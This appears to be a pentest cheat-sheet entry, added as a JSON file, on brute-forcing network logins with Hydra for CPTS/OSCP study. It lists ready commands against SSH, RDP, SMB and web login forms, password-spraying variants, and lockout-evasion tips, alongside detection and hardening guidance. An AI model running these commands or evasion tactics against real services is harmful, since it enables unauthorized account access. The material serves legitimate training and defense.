@@ -1,0 +1,119 @@
+{
+  "id": "hydra-bruteforce",
+  "name": "Hydra - Brute Force Network Service",
+  "command": "hydra -L <user.list> -P <password.list> <proto>://<ip>",
+  "description": "Online password brute force against a network service. -L/-P take username and password lists; swap to -l/-p for a single value; -C uses a combined user:pass file. -t limits parallel tasks to avoid lockouts.",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "hydra"
+  ],
+  "tags": [
+    "hydra",
+    "brute-force",
+    "ssh",
+    "rdp",
+    "smb"
+  ],
+  "category": "Password Attacks",
+  "subcategory": "Brute Forcing",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "examples": [
+    {
+      "label": "Brute-force SSH login",
+      "command": "hydra -L user.list -P password.list ssh://10.129.42.197"
+    },
+    {
+      "label": "Brute-force RDP (4 threads)",
+      "command": "hydra -L user.list -P password.list rdp://10.129.42.197 -t 4"
+    },
+    {
+      "label": "Brute-force SMB login",
+      "command": "hydra -L user.list -P password.list smb://10.129.42.197"
+    },
+    {
+      "label": "Single known user, wordlist, non-standard port (-l lowercase, -s port)",
+      "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<ip>"
+    },
+    {
+      "label": "Password spray: user list, single known password (-L file, -p single)",
+      "command": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p '<password>' rdp://<ip>"
+    },
+    {
+      "label": "OSCP Ch15 — HTTP-POST form brute-force (^USER^ and ^PASS^ are replaced each attempt)",
+      "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form \"/<login_path>:username=^USER^&password=^PASS^:F=incorrect\""
+    }
+  ],
+  "notes": "hydra brute-forces network logins (ssh, ftp, http-form, smb, rdp...). Respect lockout policy - a spray (one password, many users) is safer than a brute. `-L users -P pass -f` stops on first hit.\n-l (lowercase) = single username; -L = username list. -p (lowercase) = single password; -P = password list. -s = non-standard port (e.g. -s 2222 for SSH on 2222). -t = threads (default 16; use -t 4 for RDP which has thread limits). Also covered in: OSCP PEN-200 Chapter 15 (Password Attacks).",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "Login Brute Forcing",
+      "url": "https://academy.hackthebox.com/course/preview/login-brute-forcing"
+    },
+    {
+      "title": "OffSec PEN-200 - Password Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "netexec-spray",
+      "note": "Password spraying tries one password against many accounts to stay under lockout thresholds, optionally across a whole subnet.",
+      "rel": "alternative"
+    },
+    {
+      "id": "username-anarchy",
+      "rel": "prereq",
+      "note": "Generate the username candidate list first."
+    }
+  ],
+  "variations": [
+    {
+      "label": "SSH",
+      "command": "hydra -L <user.list> -P <password.list> ssh://<ip>"
+    },
+    {
+      "label": "RDP",
+      "command": "hydra -L <user.list> -P <password.list> rdp://<ip> -t 4"
+    },
+    {
+      "label": "SMB",
+      "command": "hydra -L <user.list> -P <password.list> smb://<ip>"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1110.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Hydra performs online password brute-forcing/guessing against a network service (SSH, FTP, HTTP, SMB, RDP, etc.) by trying username/password combinations live.",
+    "prerequisites": "Network access to the target service and username/password lists.",
+    "impact": "Valid credentials for the service - initial access or lateral movement.",
+    "detection": "Failed authentication bursts: Windows 4625 (failed logon) and 4771 (Kerberos pre-auth failed) at abnormal rate/volume; account lockouts (4740); many attempts from one source, or - for spraying - one password across many accounts. SIEM correlation on failed-logon spikes.",
+    "artifacts": "A flood of failed auth attempts against the service in its logs and Windows 4625/4771.",
+    "prevention": "[MITRE T1110 M1032 Multi-factor Authentication] MFA defeats password guessing; [M1027 Password Policies] strong passwords + [M1036 Account Use Policies] lockout thresholds; alert on failed-logon spikes and impossible-travel.",
+    "evasion": "Spray low-and-slow (one password, spaced attempts) to stay under lockout thresholds and volume alerts; distribute across source IPs; target accounts unlikely to be monitored.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1110.001"
+    ],
+    "misconfiguration": "Password policies are insufficiently strict: minimum length too short (< 12 chars), no complexity requirement, no history check (allows password reuse), no lockout or too-lenient lockout threshold. Combined with credential reuse across services, a single cracked hash grants access to multiple systems.",
+    "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
+    "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
+  }
+}
